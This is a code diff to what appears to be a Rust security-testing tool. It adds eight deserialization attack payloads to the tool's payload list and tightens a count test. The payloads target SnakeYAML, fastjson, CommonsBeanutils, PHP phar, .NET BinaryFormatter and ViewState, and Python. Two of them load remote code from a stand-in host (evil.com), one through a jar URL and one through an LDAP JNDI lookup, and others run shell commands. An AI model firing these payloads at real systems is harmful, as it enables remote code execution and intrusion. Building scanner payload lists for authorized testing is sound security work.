@@ -198,6 +198,62 @@ pub fn get_payloads() -> Vec<Payload> {
             severity: Severity::Medium,
             tags: vec!["deser".to_string(), "javascript".to_string()],
         },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/evil.jar"]]]]"#.to_string(),
+            description: "YAML deserialization - SnakeYAML ScriptEngine".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "yaml".to_string(), "java".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"!!java.lang.Runtime [!!java.lang.ProcessBuilder [["bash","-c","id"]]]"#.to_string(),
+            description: "YAML deserialization - SnakeYAML Runtime".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "yaml".to_string(), "java".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"phar:///var/www/html/upload.jpg/test"#.to_string(),
+            description: "PHP phar deserialization path".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "php".to_string(), "phar".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"AAEAAAD/////AQAAAAAAAAAMAgAAAFRTeXN0ZW0uRHJhdmluZy5CaW5hcnlGb3JtYXR0ZXI="#.to_string(),
+            description: ".NET BinaryFormatter serialized object".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "dotnet".to_string(), "binary".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"/wEFAREAAQAAAP////8BAAAAAAIAAA=="#.to_string(),
+            description: ".NET ViewState serialized payload".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "dotnet".to_string(), "viewstate".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"{"@type":"org.apache.commons.beanutils.BeanComparator","property":"class","comparator":{"@type":"java.util.Collections$ReverseComparator"}}"#.to_string(),
+            description: "Java deserialization - CommonsBeanutils".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "java".to_string(), "commons-beanutils".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"__import__('os').system('id')"#.to_string(),
+            description: "Python RestrictedPython escape".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "python".to_string(), "restricted".to_string()],
+        },
+        Payload {
+            payload_type: PayloadType::Deser,
+            payload: r#"{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/exploit","autoCommit":true}"#.to_string(),
+            description: "Java deserialization - JdbcRowSetImpl JNDI".to_string(),
+            severity: Severity::Critical,
+            tags: vec!["deser".to_string(), "java".to_string(), "jndi".to_string()],
+        },
     ]
 }
 
@@ -214,7 +270,7 @@ mod tests {
     #[test]
     fn test_get_payloads_count_reasonable() {
         let payloads = get_payloads();
-        assert!(payloads.len() > 0);
+        assert!(payloads.len() >= 25);
         assert!(payloads.len() < 10000);
     }
 
